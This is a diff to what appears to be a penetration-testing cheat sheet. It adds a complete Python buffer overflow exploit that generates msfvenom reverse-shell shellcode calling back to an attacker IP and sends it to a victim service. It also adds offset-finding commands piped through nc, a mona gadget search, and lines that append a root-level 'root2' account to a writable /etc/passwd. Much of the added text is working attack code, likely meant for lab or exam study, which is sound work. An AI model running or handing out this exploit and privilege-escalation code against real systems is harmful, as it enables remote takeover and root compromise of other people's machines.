@@ -941,7 +941,7 @@ hashcat --help | grep -i "md5"
 hashcat --example-hashes | grep -FB2 ' $1$'  # "-F"=force raw string lookup
 
 # specify mangling rules with addition of
--r /usr/share/doc/hashcat/rules/best64.rule
+-r /usr/share/hashcat/rules/best64.rule
 
 # basic crack syntax:
 # hashcat -m MODE [OPTIONS] HASH/FILE WORDLIST [WORDLIST...]
@@ -1047,28 +1047,122 @@ a buffer overflow exploit.
 
 ```py
 #!/usr/bin/env python3
+from struct import pack
 import shlex
 from subprocess import check_output
+from socket import create_connection
 
-__cyclic = ""
+
+VICTIM_IP = "192.168.144.10"
+VICTIM_PORT = 2233
+
+
+def p32(val):
+    """Pack a little endian 32-bit integer"""
+    return pack("<I", val)
+
+
+def hexbytes(raw_bytes):
+    """Converts raw bytes to hex-escaped string"""
+    return "".join(f"\\x{b:02x}" for b in raw_bytes)
+
+
+def gen_bytes(bad_bytes=b"\x00"):
+    """Generate sequence of all bytes, excluding known bad ones."""
+    print(f"[*] Excluded bytes: {hexbytes(bad_bytes)}")
+    return bytes(range(256)).translate(None, delete=bad_bytes)
+
+
 def cyclic(length):
-    """Generates a cyclic pattern if given length.
-    The pattern's bytes can be fed into the ragg2 tool from the
-    radare2 project to find offsets in memory corruption vulns"""
-    global __cyclic
-    if len(__cyclic) < length:
-        __cyclic = check_output(
-            shlex.split(f"ragg2 -rP {length * 2}")
-            ).decode()
-    return __cyclic[:length]
-
-def badbytes(known_bad=b"\x00"):
-    """Generates a series of bytes, omitting known bad ones, to help identify
-    other bad bytes.
-    To add more bytes to the known-bad set, just make a longer byte string,
-    e.g. b"\x00\x0a\x0d"
     """
-    return bytes(range(256)).translate(None, delete=known_bad)
+    Create a cyclic pattern for finding offsets for shellcode.
+
+    Relies on metasploit's pattern_create being installed on host.
+    """
+    return check_output(shlex.split(f"msf-pattern_create -l {length}"))[:length]
+
+
+def gen_shellcode(
+    payload="windows/shell_reverse_tcp",
+    arch="x86",
+    platform="windows",
+    encoder="x86/shikata_ga_nai",
+    bad_bytes=b"\x00",
+    options=None,  # dict of LHOST, LPORT, etc.
+    outfile="shellcode.bin",
+):
+    if options is None:
+        options = {"LHOST": "192.168.119.144", "LPORT": "443"}
+    options = shlex.join(f"{k}={v}" for k, v in options.items())
+
+    if isinstance(bad_bytes, bytes):
+        bad_bytes = hexbytes(bad_bytes)
+
+    cmd = shlex.split(
+        "msfvenom -f raw "
+        f"-p {payload} "
+        f"-a {arch} "
+        f"--platform {platform} "
+        f"-e {encoder} "
+        f"-b '{bad_bytes}' "
+        f"{options}"
+    )
+
+    print(f"[*] Generating shellcode with command: '{shlex.join(cmd)}'")
+    shellcode = check_output(cmd)
+
+    with open(outfile, "wb") as f:
+        f.write(shellcode)
+    print(f"[*] Raw shellcode saved to '{outfile}'")
+
+    return shellcode
+
+
+def send_payload(payload, recv_first=False):
+    addr = (VICTIM_IP, VICTIM_PORT)
+    c = create_connection(addr)
+    if recv_first:
+        print(c.recv(4096))
+    print(f"[*] Sending {len(payload)}-byte payload to {VICTIM_IP}:{VICTIM_PORT}")
+    c.send(payload)
+    c.close()
+
+
+eip_offset = 2306
+jmp_esp = p32(0x1120110D)
+bad_bytes = b"\x00Q"
+padding = b"A" * eip_offset
+nopsled = b"\x90" * 32
+
+payload = padding
+payload += jmp_esp
+payload += nopsled
+payload += gen_shellcode(bad_bytes=bad_bytes)
+send_payload(payload)
+
+print("[+] DONE!")
+```
+
+For quick-and dirty offset finding, sometimes you can try something like:
+
+```sh
+# using radare2's ragg2 utility for pattern generation:
+ragg2 -rP 4096 | nc -nv $VICTIM_IP $PORT
+# look up offset (note: must be hex value with '0x' at start!):
+ragg2 -q 0x414a4141
+
+# using msf's pattern_create.rb:
+msf-pattern_create -l 1024 | nc -nv $VICTIM_IP $PORT
+# look up offset (can be either hex value or string)
+msf-pattern_offset -q 2Aa3
+```
+
+In Windows' Immunity Debugger, you can use [mona.py]() for building exploits.
+Here are some useful commands:
+
+```sh
+# find 'jmp esp' gadget, excluding bad bytes in the pointer
+!mona jmp -r esp -cpb '\x00\x51'
 ```
 
 ## 4.5. Reverse Shells
@@ -2070,12 +2164,14 @@ done
 # if /etc/shadow is writable
 # generate new password
 mkpasswd -m sha-512 password
+# or
+openssl passwd -1 -salt derp password
 # edit /etc/shadow and overwrite hash of root with this one
 
 # if /etc/passwd is writable
 echo "root2:$(mkpasswd -m sha-512 password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # alternatively
-echo "root2:$(openssl passwd password):0:0:root:/root:/bin/bash" >> /etc/passwd
+echo "root2:$(openssl passwd -1 -salt derp password):0:0:root:/root:/bin/bash" >> /etc/passwd
 # can also add generated password between the first and second colon of root user
 ```
 
@@ -2499,6 +2595,21 @@ Uploading files from Linux using curl:
 ```sh
 curl -v http://192.168.119.144/upload.php -F "file=@somefile"
 ```
+
+If large files fail to upload properly, change the `php.ini` or `.user.ini` settings:
+
+```sh
+# on kali, find and edit file
+find / -iname php.ini 2>/dev/null
+sudo vim /etc/php/7.4/apache2/php.ini
+# in php.ini, change the following:
+memory_limit = -1         # disable php memory limit
+upload_max_filesize = 10G # make it 10GiB
+post_max_size = 0         # make it unlimited
+max_execution_time = 120  # allow uploads to take 2 minutes
+```
+
+**Note:** The .user.ini file goes in your site’s document root.
 
 ## 7.3. Grabbing Passwords
 
